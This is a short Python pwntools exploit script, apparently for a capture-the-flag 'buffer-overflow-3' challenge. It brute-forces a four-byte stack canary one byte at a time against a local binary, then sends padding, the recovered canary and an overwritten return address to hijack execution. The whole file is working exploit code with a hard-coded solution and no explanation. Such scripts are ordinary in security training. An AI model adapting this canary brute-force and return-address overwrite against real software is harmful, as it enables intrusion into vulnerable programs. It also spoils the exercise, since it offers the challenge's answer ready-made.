from pwn import *

def get_canary(known_bytes):
  for i in xrange(256):
    if i == 10: continue
    p = process("/problems/buffer-overflow-3_4_931796dc4e43db0865e15fa60eb55b9e/vuln")
    p.sendline(str(32 + len(known_bytes) + 1))
 
    junk = "A" * 32
    p.sendline(junk + known_bytes + chr(i))

    resp= p.recv(1024)
    if "Stack" not in resp: return i

"""
canary = ""
while len(canary) < 4:
  canary += chr(get_canary(canary))
  print repr(canary)
"""

canary = "<zO%"

p = process("/problems/buffer-overflow-3_4_931796dc4e43db0865e15fa60eb55b9e/vuln")
p.sendline("100")
p.sendline("A" * 32 + canary + "B" * 16 + p32(0x80486eb))
print p.recv(1024)
